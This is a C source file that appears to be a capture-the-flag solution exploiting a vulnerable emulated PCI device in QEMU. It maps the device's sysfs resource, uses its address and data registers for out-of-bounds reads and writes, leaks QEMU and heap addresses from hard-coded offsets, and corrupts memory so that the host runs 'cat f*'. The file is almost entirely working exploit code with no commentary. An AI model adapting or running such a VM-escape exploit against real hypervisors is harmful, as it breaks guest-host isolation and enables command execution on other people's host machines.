#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

uint32_t *map;

int open_device() {
  int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR);
  if (fd < 0) {
    perror("open");
    exit(1);
  }
  return fd;
}

void set_addr(size_t addr) {
  map[0] = addr;
  map[1] = addr >> 32LL;
}

void set_data(uint32_t data) { map[2] = data; }
void set64(size_t offset, uint64_t data) {
  set_addr(offset);
  set_data(data);
  set_addr(offset + 4);
  set_data(data >> 32);
}

uint64_t get_data();

uint64_t get64(size_t offset) {
  set_addr(offset);
  uint64_t lower = get_data();
  set_addr(offset + 4);
  uint64_t upper = get_data();
  return lower + (upper << 32);
}

uint64_t get_data() { return *(uint32_t *)&map[2]; }

int main() {
  int fd = open_device();
  if (fd == -1) {
    system("/bin/mount -t sysfs sysfs /sys");
  }
  fd = open_device();
  if (fd == -1) {
    return 1;
  }

  map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  uint64_t qemu = get64(-0x100 + 0x70);
  uint64_t heap = get64(-0x100 + 0xc8) + 0x40;
  qemu -= 0x72fa50;
  //   getchar();

  uint64_t mock[] = {0xdeadbeef, qemu + 0x324150, 0,           0, 2, 0,
                     0,          0,          0x400000001, 0, 0, 0};
  for (int i = 0; i < sizeof(mock) / sizeof(mock[0]); i++) {
    set64(i << 3, mock[i]);
  }

  uint64_t i = 0;
  while (1) {
    i -= 8;
    if (get64(i) == qemu + 0xd1d100) {
      break;
    }
  }
  uint64_t ptr = get64(i + 8);
  char *cmd = "cat f*";
  set64(-heap + ptr, *(uint64_t *)cmd);
  set_addr(i);
  set_data(heap);
  set_addr(0);
}